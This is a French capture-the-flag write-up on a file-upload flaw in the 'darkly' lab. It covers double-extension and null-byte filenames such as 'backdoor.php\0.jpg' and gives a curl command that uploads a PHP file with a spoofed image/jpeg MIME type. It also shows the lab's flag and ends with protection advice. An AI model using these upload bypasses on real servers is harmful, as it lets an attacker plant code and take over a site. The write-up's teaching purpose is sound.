# Faille upload

Cette faille est très dangereuse car un utilisateur malintentionné pourrait prendre le contrôle du site ou le serveur.

Quand on fait un formulaire avec un input de type file, on peut avoir principalement deux failles différentes :

* Faille avec double extension : même si on limite le type de fichier en vérifiant l'extension, un utilisateur pourrait charger sur le serveur une image appelée `backdoor.php.jpg` ou bien `backdoor.php\0.jpg`.
Le `\0` indique le fin de la chaine et il pourrait être enregistré comme backdoor.php.

* Faille sur la vérification du type MIME : c'est la faille que l'on peut exploiter sur darkly.
Le type MIME d’un fichier désigne le type de contenu dont est composé un fichier, mais il est possible de faire une requete en spécifiant le type `image/jpeg` quand on envoi un fichier `.php`.

## Le flag

Pour avoir le flag on peut utiliser l'application postman ou cURL.

On inspecte le formulaire et on voit qu'il y a deux input qui seront envoyés, `uploaded` qui correspond à l'image et `submit` pour le button.

```html
<form enctype="multipart/form-data" action="#" method="POST">

	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">

</form>
```

On peut alors utiliser curl avec les deux inputs envoyés mais en spécifiant le `type=image/jpeg` pour le fichier `.php`.

```shell script
curl -X POST 'http://10.2.8.38/?page=upload' -F 'uploaded=@/Users/lgarcia-/test.php;type=image/jpeg' -F 'Upload=Upload'
```

Sur la réponse du serveur on pourra voir le flag.

```html
<!DOCTYPE HTML>
<html>
[...]
    <!-- Main -->
    <section id="main" class="wrapper">
        <div class="container" style="margin-top:75px">
            <pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
            [...]

</html>
```

## Comment s'en proteger ?

Il ne faut pas se fier des extensions et vérifier qu'il n'y a pas `.php` sur l'extension.
On peut aussi vérifier le type MIME mais ne peut pas être la seul vérification.

Il faut renomer le fichier avec un nom aléatoire pour éviter qu'il soit écrasé et vérifier la taille de celui-ci.
Il est important aussi d'assigner les bonnes permissions au répertoire.